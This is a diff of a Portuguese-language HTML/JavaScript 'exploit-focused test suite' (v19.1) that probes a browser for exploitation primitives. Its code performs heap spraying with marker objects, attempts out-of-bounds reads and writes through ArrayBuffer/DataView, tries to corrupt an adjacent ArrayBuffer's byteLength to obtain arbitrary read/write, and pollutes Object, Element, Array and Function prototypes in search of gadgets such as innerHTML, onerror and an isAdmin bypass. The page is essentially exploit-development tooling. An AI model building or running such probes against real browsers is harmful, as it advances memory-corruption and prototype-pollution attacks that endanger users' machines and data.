@@ -2,14 +2,14 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Suite de Testes Focada em Exploit (v19.0)</title>
+    <title>Suite de Testes Focada em Exploit (v19.1)</title>
     <style>
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #output {
             background: #222;
             border: 1px solid #444;
             padding: 10px;
-            height: 50vh; /* Aumentado um pouco */
+            height: 50vh;
             overflow-y: auto;
             white-space: pre-wrap;
             margin-top: 10px;
@@ -20,7 +20,7 @@
             padding: 10px;
             margin-top: 15px;
             font-size: 13px;
-            max-height: 70vh; /* Altura aumentada */
+            max-height: 70vh;
             overflow-y: auto;
         }
         #summary h2 { margin-top: 0; color: #eee; font-size: 15px; border-bottom: 1px solid #444; padding-bottom: 5px;}
@@ -43,15 +43,15 @@
     </style>
 </head>
 <body>
-    <h1>Suite de Testes Focada em Exploit (v19.0)</h1>
-    <p>Foco: OOB Read/Leak, OOB Write (Metadata), PP Avançada/Gadgets, Hijack+OOB Interaction.</p>
-    <button id="runBtn" onclick="runExploitFocusedTests()">Iniciar Testes Focados (v19.0)</button>
+    <h1>Suite de Testes Focada em Exploit (v19.1)</h1>
+    <p>Foco: OOB Read/Leak (c/ Spray), OOB Write (Metadata), PP Avançada/Gadgets, Hijack+OOB Interaction.</p>
+    <button id="runBtn" onclick="runExploitFocusedTests()">Iniciar Testes Focados (v19.1)</button>
     <div id="output"></div>
     <hr>
     <div id="summary"></div>
 
     <script>
-        // --- Script Focado em Exploit (v19.0) ---
+        // --- Script Focado em Exploit (v19.1) ---
         const outputDiv = document.getElementById('output');
         const runBtn = document.getElementById('runBtn');
         const SHORT_PAUSE = 50;
@@ -61,12 +61,11 @@
 
         const IMPORTANT_LOG_TYPES = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good'];
 
-        // Função log adaptada
+        // Função log adaptada (v19.0)
         const log = (message, type = 'info', funcName = '') => {
             let keepLog = IMPORTANT_LOG_TYPES.includes(type);
              if (!keepLog && type === 'good') {
                  const lowerMsg = String(message).toLowerCase();
-                 // Manter logs 'good' que indicam falha ou bloqueio de uma ação esperada
                  if (lowerMsg.includes('bloqueado') || lowerMsg.includes('falhou') || lowerMsg.includes('não afetou') ||
                      lowerMsg.includes('não encontrado') || lowerMsg.includes('não suportado') || lowerMsg.includes('não disponível') ||
                      lowerMsg.includes('nenhum leak') || lowerMsg.includes('nenhuma corrupção detectada') || lowerMsg.includes('sem erro')) {
@@ -74,87 +73,51 @@
                  }
              }
             if (!keepLog) return;
-
-            if (!outputDiv) return;
-            try {
-                const timestamp = `[${new Date().toLocaleTimeString()}]`;
-                const prefix = funcName ? `[${funcName}] ` : '';
-                // Sanitizar a mensagem para evitar XSS no próprio log
-                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
-
-                // Registrar findings críticos para o sumário
-                if (['vuln', 'critical', 'escalation', 'ptr', 'leak'].includes(type)) { // Adicionado ptr e leak ao sumário
-                    findings.push({ type, funcName, message: sanitizedMessage, time: timestamp });
-                }
-
-                // Limitar tamanho do log para evitar travamentos
-                if(outputDiv.innerHTML.length > 800000){ // Aumentado limite um pouco
-                    outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 400000);
-                    outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML;
-                }
-
-                // Adicionar log ao div
-                outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
-                // Scroll automático para o fim
-                outputDiv.scrollTop = outputDiv.scrollHeight;
-            } catch(e) {
-                // Logar erro no console se a função de log falhar
-                console.error("Erro na função log:", e);
-                if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
-            }
+            if (!outputDiv) return; try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if (['vuln', 'critical', 'escalation', 'ptr', 'leak'].includes(type)) { findings.push({ type, funcName, message: sanitizedMessage, time: timestamp }); } if(outputDiv.innerHTML.length > 800000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 400000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; } outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch(e) { console.error("Erro na função log:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
         };
 
-        // Funções Helper
+        // Funções Helper (v19.0)
         const PAUSE = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
-        const toHex = (val, bits = 32) => {
-            if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
-            let num = Number(val);
-            if (bits <= 32) { num = num >>> 0; } // Tratar como unsigned 32-bit
-            const pad = Math.ceil(bits / 4);
-            return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
-        };
-        const isPotentialPointer64 = (high, low) => {
-            if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;
-            // Ignorar valores comuns ou nulos
-            if (high === 0 && low === 0) return false;
-            const high_u = high >>> 0; // Comparação unsigned
-            const low_u = low >>> 0;
-            if (high_u === 0xFFFFFFFF && low_u === 0xFFFFFFFF) return false;
-            if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAAA) return false;
-            // Ignorar ponteiros muito baixos (provavelmente não válidos)
-            if (high === 0 && low < 0x100000) return false;
-            return true;
-        };
-        const isPotentialData32 = (val) => {
-            if (val === null || typeof val !== 'number') return false;
-            val = val >>> 0; // Comparação unsigned
-            // Ignorar valores comuns ou nulos/padrão
-            if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false;
-            // Ignorar valores muito baixos
-            if (val < 0x1000) return false;
-            return true;
-        };
+        const toHex = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); };
+        const isPotentialPointer64 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; const high_u = high >>> 0; const low_u = low >>> 0; if (high_u === 0xFFFFFFFF && low_u === 0xFFFFFFFF) return false; if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true; };
+        const isPotentialData32 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true; };
 
-        // --- Testes Prioritários ---
+        // --- Testes Prioritários (v19.1 - OOB Read com Spray) ---
 
-        // 1. Teste de Leitura OOB / Vazamento de Info (Baseado no Script 1 v18.1.1)
+        // 1. Teste de Leitura OOB / Vazamento de Info (v19.1 com Spray)
         const testOOBReadInfoLeak = async () => {
             const FNAME = 'testOOBReadInfoLeak';
-            log("--- Iniciando Teste 1: OOB Write/Read (Leak) ---", 'test', FNAME);
-            const bufferSize = 32; const writeValue = 0xEE; const oobWriteOffset = bufferSize;
-            const readRangeStart = -64; const readRangeEnd = bufferSize + 64;
-            const allocationSize = bufferSize + 256; const baseOffsetInBuffer = 128;
+            log("--- Iniciando Teste 1: OOB Write/Read (Leak c/ Spray) ---", 'test', FNAME);
+            // Parâmetros ligeiramente ajustados
+            const bufferSize = 48; // Aumentado
+            const writeValue = 0xEE; const oobWriteOffset = bufferSize;
+            const readRangeStart = -80; const readRangeEnd = bufferSize + 80; // Faixa de leitura um pouco maior
+            const allocationSize = bufferSize + 384; // Aumentado significativamente
+            const baseOffsetInBuffer = 192; // Ajustado
+            const sprayCount = 200; // Número de objetos para spray
+            const sprayedObjects = [];
+
             const oobReadOffsets = [];
             for (let i = readRangeStart; i < readRangeEnd; i += 4) { oobReadOffsets.push(i); }
             let writeSuccess = false; let potentialLeakFoundCount = 0;
             leakedValueFromOOB = null; // Resetar leak global
 
             try {
+                // --- v19.1: Object Spray ---
+                log(`Realizando spray de ${sprayCount} objetos...`, 'info', FNAME);
+                for (let i = 0; i < sprayCount; i++) {
+                    sprayedObjects.push({
+                        marker: 0x41414141 + i, // Valor reconhecível
+                        padding: 0x42424242 // Outro valor
+                    });
+                }
+                log(`Spray concluído.`, 'info', FNAME);
+                await PAUSE(SHORT_PAUSE); // Pausa após spray
+
+                // --- Alocação do buffer de controle ---
                 const buffer = new ArrayBuffer(allocationSize);
                 const dataView = new DataView(buffer);
-                // Preencher buffer com padrão conhecido
-                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); }
+                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); } // Preencher
 
                 const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset;
                 await PAUSE();
@@ -168,7 +131,7 @@
                 } catch (e) {
                     log(`Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) FALHOU/Bloqueada: ${e.message}`, 'good', FNAME);
                     log(`--- Teste 1 Concluído (Escrita OOB Falhou) ---`, 'test', FNAME);
-                    return false; // Não continuar se a escrita falhar
+                    return false;
                 }
 
                 await PAUSE();
@@ -179,367 +142,168 @@
                     const readTargetAddress = baseOffsetInBuffer + readOffset;
                     const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`;
 
-                    // Tentar ler como U64 (potencial ponteiro)
+                    // Tentar ler como U64
                     if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) {
                         try {
                             const low = dataView.getUint32(readTargetAddress, true);
                             const high = dataView.getUint32(readTargetAddress + 4, true);
-                            if (isPotentialPointer64(high, low)) {
-                                const vStr = `H=${toHex(high)} L=${toHex(low)}`;
-                                log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME);
-                                potentialLeakFoundCount++;
-                                if (leakedValueFromOOB === null) {
-                                    leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset };
-                                    log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}: H=${toHex(high)}, L=${toHex(low)}.`, 'vuln', FNAME);
-                                    log(` ---> *** ALERTA: Primitivo Relevante (OOB Read Pointer Leak) ***`, 'escalation', FNAME);
+                            // Checar se não é o padrão de preenchimento AA ou o padrão do spray (improvável em 64 bits)
+                            if (!((high === 0xAAAAAAAA && low === 0xAAAAAAAA))) {
+                                if (isPotentialPointer64(high, low)) {
+                                    const vStr = `H=${toHex(high)} L=${toHex(low)}`;
+                                    log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME);
+                                    potentialLeakFoundCount++;
+                                    if (leakedValueFromOOB === null) {
+                                        leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset };
+                                        log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}: H=${toHex(high)}, L=${toHex(low)}.`, 'vuln', FNAME);
+                                        log(` ---> *** ALERTA: Primitivo Relevante (OOB Read Pointer Leak) ***`, 'escalation', FNAME);
+                                    }
+                                } else if (high === 0x41414141 || low === 0x41414141 || high === 0x42424242 || low === 0x42424242) {
+                                     // v19.1: Checa se leu parte de um objeto do spray
+                                     log(` -> Objeto Spray? U64 ${relOffsetStr}: H=${toHex(high)} L=${toHex(low)}`, 'leak', FNAME);
+                                     potentialLeakFoundCount++;
                                 }
                             }
-                        } catch (e) { /* Ignorar erros de leitura */ }
+                        } catch (e) {}
                     }
 
-                    // Se ainda não achou leak, tentar ler como U32 (potencial dado)
+                    // Tentar ler como U32
                     if (leakedValueFromOOB === null && readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) {
                         try {
                             const val32 = dataView.getUint32(readTargetAddress, true);
-                            if (isPotentialData32(val32)) {
-                                log(` -> Leak U32? ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME);
-                                potentialLeakFoundCount++;
-                                leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset };
-                                log(` -> VALOR U32 ARMAZENADO ${relOffsetStr}: ${toHex(val32)}.`, 'vuln', FNAME);
-                                log(` ---> *** ALERTA: Potencial Vazamento Info OOB Read U32 ***`, 'escalation', FNAME);
+                             // Checar se não é o padrão de preenchimento AA
+                            if (val32 !== 0xAAAAAAAA) {
+                                if (isPotentialData32(val32)) {
+                                     // v19.1: Checa se leu parte de um objeto do spray
+                                    if (val32 >= 0x41414141 && val32 < (0x41414141 + sprayCount) || val32 === 0x42424242) {
+                                         log(` -> Objeto Spray? U32 ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME);
+                                    } else {
+                                         log(` -> Leak U32? ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME);
+                                    }
+                                    potentialLeakFoundCount++;
+                                    leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset };
+                                    log(` -> VALOR U32 ARMAZENADO ${relOffsetStr}: ${toHex(val32)}.`, 'vuln', FNAME);
+                                    log(` ---> *** ALERTA: Potencial Vazamento Info OOB Read U32 ***`, 'escalation', FNAME);
+                                }
+                                // Checar se leu o valor escrito OOB
+                                if (readOffset === oobWriteOffset && val32 === (writeValue | (0xAA << 8) | (0xAA << 16) | (0xAA << 24))) {
+                                    log(` -> Leu valor OOB escrito (${toHex(val32)}) ${relOffsetStr}! Confirma R/W.`, 'vuln', FNAME);
+                                }
                             }
-                            // Checar se leu o valor escrito OOB
-                            if (readOffset === oobWriteOffset && val32 === (writeValue | (0xAA << 8) | (0xAA << 16) | (0xAA << 24))) {
-                                log(` -> Leu valor OOB escrito (${toHex(val32)}) ${relOffsetStr}! Confirma R/W.`, 'vuln', FNAME);
-                            }
-                        } catch (e) { /* Ignorar erros de leitura */ }
+                        } catch (e) {}
                     }
-                    if (readOffset % 32 === 0) await PAUSE(1); // Pequena pausa para não sobrecarregar
+                    if (readOffset % 32 === 0) await PAUSE(1);
                 }
             } catch (e) {
                 log(`Erro fatal no Teste 1: ${e.message}`, 'error', FNAME);
                 console.error(e);
             } finally {
+                // Limpar spray (ajuda GC, mas não essencial para o teste)
+                sprayedObjects.length = 0;
                 const leakStatus = leakedValueFromOOB
                     ? `1 valor ${leakedValueFromOOB.type} @${leakedValueFromOOB.offset} (H=${toHex(leakedValueFromOOB.high)}, L=${toHex(leakedValueFromOOB.low)})`
                     : 'nenhum valor armazenado';
                 log(`--- Teste 1 Concluído (${potentialLeakFoundCount} leaks potenciais?, ${leakStatus}) ---`, 'test', FNAME);
             }
-            return writeSuccess; // Retorna se a escrita inicial funcionou
+            return writeSuccess;
         };
 
-        // 2. Teste de Escrita OOB (Metadata - Baseado no Script 2 v18.1)
+        // 2. Teste de Escrita OOB (Metadata - Inalterado v19.0)
         const testOOBWriteMetadata = async () => {
             const FNAME = 'testOOBWriteMetadata';
             log("--- Teste 2: OOB Write -> Metadata (ArrayBuffer.byteLength) ---",'test', FNAME);
             const controlBufferSize=64; const targetBufferSize=64; const sprayCount=50;
-            const targetValue=0x7FFFFFFE; // Valor grande para corromper byteLength
-            const targetBuffers=[]; let controlBuffer=null; let dv=null;
+            const targetValue=0x7FFFFFFE; const targetBuffers=[]; let controlBuffer=null; let dv=null;
             let writeSuccessCount = 0; let corruptionSuccess = false;
             const allocationSize = controlBufferSize + 256; const baseOffsetInBuffer = 128;
             let foundOffset=-1; let finalResultLog = `AVISO: Escrita OOB realizada (${writeSuccessCount}x), mas nenhuma corrupção de byteLength detectada.`;
-
-            try {
-                controlBuffer=new ArrayBuffer(allocationSize);
-                dv=new DataView(controlBuffer);
-                for(let i=0; i<controlBuffer.byteLength; i++) dv.setUint8(i, 0xDD); // Preencher buffer de controle
-            } catch(e) {
-                log(`Erro fatal alocar buffer ctrl: ${e.message}`, 'error', FNAME);
-                return; // Abortar se não conseguir alocar
-            }
-
+            try{ controlBuffer=new ArrayBuffer(allocationSize); dv=new DataView(controlBuffer); for(let i=0; i<controlBuffer.byteLength; i++)dv.setUint8(i, 0xDD); }catch(e){ log(`Erro fatal alocar buffer ctrl: ${e.message}`, 'error', FNAME); return; }
             log(`Alocando ${sprayCount} buffers alvo de ${targetBufferSize} bytes...`, 'info', FNAME);
             for(let i=0; i<sprayCount; i++){ try{ targetBuffers.push(new ArrayBuffer(targetBufferSize)); }catch(e){}}
             await PAUSE();
-
-            // Offsets relativos ao fim do buffer de controle onde o metadata do próximo buffer pode estar
             const metadataOffsetsToTry=[-8, -4, 0, 4, 8, 12, 16, 20, 24, 28, 32];
-
             for(const tryOffset of metadataOffsetsToTry){
                 const targetWriteAddr = baseOffsetInBuffer + controlBufferSize + tryOffset;
                 const relOffsetStr = `ctrlEnd+${tryOffset} (addr ${targetWriteAddr})`;
                 log(`Tentando offset OOB metadata: ${tryOffset}... Addr: ${targetWriteAddr}`, 'info', FNAME);
                 let currentWriteOK=false;
-                try {
-                    // Verificar se o offset está dentro do buffer de controle alocado
-                    if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){
-                        dv.setUint32(targetWriteAddr, targetValue, true); // Tenta escrever o valor grande
-                        writeSuccessCount++;
-                        currentWriteOK=true;
-                        log(` -> Escrita OOB U32 em ${relOffsetStr} parece OK.`, 'info', FNAME);
-                    } else {
-                        log(` -> Offset OOB ${relOffsetStr} fora dos limites do buffer de controle.`, 'warn', FNAME);
-                    }
-                } catch(e) {
-                    log(` -> Escrita OOB U32 falhou/bloqueada em ${relOffsetStr}: ${e.message}`, 'good', FNAME);
-                }
-
-                // Se a escrita OOB pareceu funcionar, verificar os buffers alvo
+                try{ if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){ dv.setUint32(targetWriteAddr, targetValue, true); writeSuccessCount++; currentWriteOK=true; log(` -> Escrita OOB U32 em ${relOffsetStr} parece OK.`, 'info', FNAME); } else { log(` -> Offset OOB ${relOffsetStr} fora dos limites do buffer de controle.`, 'warn', FNAME); } }catch(e){ log(` -> Escrita OOB U32 falhou/bloqueada em ${relOffsetStr}: ${e.message}`, 'good', FNAME); }
                 if(currentWriteOK){
                     log(` -> Verificando ${targetBuffers.length} buffers alvo...`, 'info', FNAME);
                     await PAUSE(5);
                     for(let j=0; j<targetBuffers.length; j++){
-                        try {
-                            const currentLength = targetBuffers[j]?.byteLength;
-                            // Checa se o tamanho foi corrompido para o valor esperado
-                            if(currentLength === targetValue){
-                                log(`---> VULN: ArrayBuffer alvo ${j} teve byteLength CORROMPIDO para ${toHex(targetValue)} com escrita OOB em ${relOffsetStr}! <---`, 'critical', FNAME);
-                                log(` ---> *** ALERTA: Primitivo Relevante (Corrupção Metadados OOB Write -> R/W Poderoso) ***`, 'escalation', FNAME);
-                                corruptionSuccess=true;
-                                foundOffset=tryOffset;
-                                finalResultLog = `SUCESSO! byteLength corrompido usando offset relativo ctrlEnd+${foundOffset}.`;
-
-                                // Tentar ler OOB usando o buffer corrompido para confirmar
-                                try {
-                                    const corruptedView=new DataView(targetBuffers[j]);
-                                    const readOOBAddr = targetBufferSize + 4; // Tentar ler um pouco além do tamanho original
-                                    const readOOBValue = corruptedView.getUint32(readOOBAddr, true);
-                                    log(`  -> Leitura OOB via AB ${j} corrompido @ offset ${readOOBAddr}: ${toHex(readOOBValue)}`, 'leak', FNAME);
-                                    log(` ---> *** ALERTA: Leitura OOB confirmada usando buffer corrompido! ***`, 'escalation', FNAME);
-                                } catch(eRead) {
-                                    log(`  -> Erro ao tentar leitura OOB via AB ${j} corrompido: ${eRead.message}`, 'warn', FNAME);
-                                }
-                                break; // Para o loop interno se achou um buffer corrompido
-                            }
-                        } catch(eCheck) {
-                            log(`Erro ao verificar buffer alvo ${j}: ${eCheck.message}`, 'error', FNAME);
-                        }
+                        try { const currentLength = targetBuffers[j]?.byteLength; if(currentLength === targetValue){ log(`---> VULN: ArrayBuffer alvo ${j} teve byteLength CORROMPIDO para ${toHex(targetValue)} com escrita OOB em ${relOffsetStr}! <---`, 'critical', FNAME); log(` ---> *** ALERTA: Primitivo Relevante (Corrupção Metadados OOB Write -> R/W Poderoso) ***`, 'escalation', FNAME); corruptionSuccess=true; foundOffset=tryOffset; finalResultLog = `SUCESSO! byteLength corrompido usando offset relativo ctrlEnd+${foundOffset}.`; try{ const corruptedView=new DataView(targetBuffers[j]); const readOOBAddr = targetBufferSize + 4; const readOOBValue = corruptedView.getUint32(readOOBAddr, true); log(`  -> Leitura OOB via AB ${j} corrompido @ offset ${readOOBAddr}: ${toHex(readOOBValue)}`, 'leak', FNAME); log(` ---> *** ALERTA: Leitura OOB confirmada usando buffer corrompido! ***`, 'escalation', FNAME); }catch(eRead){ log(`  -> Erro ao tentar leitura OOB via AB ${j} corrompido: ${eRead.message}`, 'warn', FNAME); } break; } } catch(eCheck) { log(`Erro ao verificar buffer alvo ${j}: ${eCheck.message}`, 'error', FNAME); }
                     }
-                    // Restaurar valor no buffer de controle para não afetar o próximo offset
                     try{ if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){ dv.setUint32(targetWriteAddr, 0xDDDDDDDD, true); } }catch(eRestore){}
                 }
-                if(corruptionSuccess) break; // Para o loop externo se achou corrupção
+                if(corruptionSuccess) break;
                 await PAUSE(10);
             }
-
-            // Log final do teste
-            if (!corruptionSuccess && writeSuccessCount === 0) {
-                finalResultLog = `Escrita OOB falhou/bloqueada em todos os offsets testados.`;
-                log(finalResultLog, 'good', FNAME);
-            } else {
-                log(finalResultLog, corruptionSuccess ? 'vuln' : 'warn', FNAME);
-            }
+            if (!corruptionSuccess && writeSuccessCount === 0) { finalResultLog = `Escrita OOB falhou/bloqueada em todos os offsets testados.`; log(finalResultLog, 'good', FNAME); } else { log(finalResultLog, corruptionSuccess ? 'vuln' : 'warn', FNAME); }
             log("--- Teste 2 Concluído ---",'test', FNAME);
             await PAUSE();
         };
 
-        // 3. Teste de PP Avançada / Gadgets (Baseado no Script 2 v18.1)
+        // 3. Teste de PP Avançada / Gadgets (Inalterado v19.0)
         const testAdvancedPP = async () => {
             const FNAME = 'testAdvancedPP';
             log("--- Teste 3: PP Avançado (Gadgets++) ---", 'test', FNAME);
-            // Definições de propsToPollute (mesmas da v18.1)
             const propsToPollute = [ { name: 'constructor', proto: Object.prototype, protoName: 'Object' }, { name: '__proto__', proto: Object.prototype, protoName: 'Object' }, { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null }, { name: 'nodeType', proto: Object.prototype, protoName: 'Object' }, { name: 'valueOf', proto: Object.prototype, protoName: 'Object' }, { name: 'toString', proto: Object.prototype, protoName: 'Object' }, { name: 'hasOwnProperty', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => { try{({}).hasOwnProperty('a'); return null;} catch(e){ return `Object.hasOwnProperty quebrou! ${e.message}`;} } }, { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'outerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'textContent', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div') }, { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')}, { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') }, { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') }, { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') }, { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') }, { name: 'onload', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onload === v ? 'PP afetou handler `onload`!' : null, createTarget: () => document.createElement('img') }, { name: 'appendChild', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v) => { try { obj.appendChild(document.createElement('span')); return null; } catch(e){ return `Node.appendChild quebrou! ${e.message}`;} } }, { name: 'addEventListener', proto: EventTarget.prototype, protoName: 'EventTarget', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v) => { try { obj.addEventListener('test', ()=>{}); return null; } catch(e){ return `EventTarget.addEventListener quebrou! ${e.message}`;} } }, { name: 'value', proto: HTMLInputElement.prototype, protoName: 'HTMLInputElement', createTarget: () => document.createElement('input'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou input.value!' : null }, { name: 'value', proto: HTMLTextAreaElement.prototype, protoName: 'HTMLTextAreaElement', createTarget: () => document.createElement('textarea'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou textarea.value!' : null }, { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].map(()=>{}); return null;} catch(e){ return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'filter', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].filter(()=>{}); return null;} catch(e){ return `Array.filter quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'forEach', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].forEach(()=>{}); return null;} catch(e){ return `Array.forEach quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'join', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[1,2].join(); return null;} catch(e){ return `Array.join quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'call', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.call(); return null;} catch(e){ return `Function.call quebrou! ${e.message}`;} }, createTarget: () => function(){} }, { name: 'apply', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.apply(); return null;} catch(e){ return `Function.apply quebrou! ${e.message}`;} }, createTarget: () => function(){} }, ];
             const testValue = "PP_Adv_Polluted_" + Date.now();
             let successCount = 0; let gadgetCount = 0; let gadgetMessages = [];
-
-            for (const item of propsToPollute) {
-                if (!item.proto) { continue; }
-                const prop = item.name;
-                const targetProto = item.proto;
-                const targetProtoName = item.protoName;
-                let inherited = false; let gadgetMsg = null; let errorMsg = null;
-                let originalValue = undefined; let wasDefined = false;
-
-                // Salvar valor original
-                try {
-                    wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop);
-                    if (wasDefined) { originalValue = targetProto[prop]; }
-                } catch (e) {
-                    log(`AVISO: Erro check/get original ${targetProtoName}.${prop}: ${e.message}`, 'warn', FNAME);
-                    continue; // Pular se não conseguir salvar
-                }
-
-                try {
-                    // Poluir
-                    targetProto[prop] = testValue;
-                    let obj;
-                    if (item.createTarget) { try { obj = item.createTarget(); } catch (e) { obj = {}; } }
-                    else { obj = {}; }
-
-                    // Verificar herança
-                    let inheritedValue = undefined;
-                    try { inheritedValue = obj[prop]; } catch (e) {}
-                    if (inheritedValue === testValue) {
-                        log(`-> VULN: Herança PP para '${targetProtoName}.${prop}' OK.`, 'vuln', FNAME);
-                        inherited = true;
-                        successCount++;
-
-                        // Verificar gadget
-                        if (item.gadgetCheck) {
-                            try { gadgetMsg = item.gadgetCheck(obj, testValue); } catch(e){}
-                            if (gadgetMsg) {
-                                log(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME);
-                                gadgetMessages.push(prop + ": " + gadgetMsg);
-                                gadgetCount++;
-                                // Alerta para gadgets perigosos
-                                if (['innerHTML', 'outerHTML', 'src', 'href', 'onclick', 'onerror', 'onload', 'value', 'postMessage', 'send', 'call', 'apply', 'map', 'filter', 'forEach', 'appendChild', 'addEventListener', 'hasOwnProperty', 'join'].includes(prop)) {
-                                    log(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME);
-                                }
-                            }
-                        }
-                    } else {
-                        if (prop === '__proto__') { log(`-> FAIL: Herança de '__proto__' não OK (Esperado).`, 'good', FNAME); }
-                    }
-                } catch (e) {
-                    log(`Erro ao poluir/testar '${targetProtoName}.${prop}': ${e.message}`, 'error', FNAME);
-                    errorMsg = e.message;
-                } finally {
-                    // Limpar / Restaurar
-                    try {
-                        let cleanupOK = true;
-                        if (wasDefined) {
-                            targetProto[prop] = originalValue;
-                            try { if (targetProto[prop] !== originalValue) cleanupOK = false; } catch(e){ cleanupOK = false; }
-                        } else {
-                            delete targetProto[prop];
-                            if (Object.prototype.hasOwnProperty.call(targetProto, prop)) cleanupOK = false;
-                        }
-                        if (!cleanupOK) {
-                            log(`---> CRITICAL: FALHA ao limpar/restaurar ${targetProtoName}.${prop}! Estado pode estar inconsistente. <---`, 'critical', FNAME);
-                        }
-                    } catch (e) {
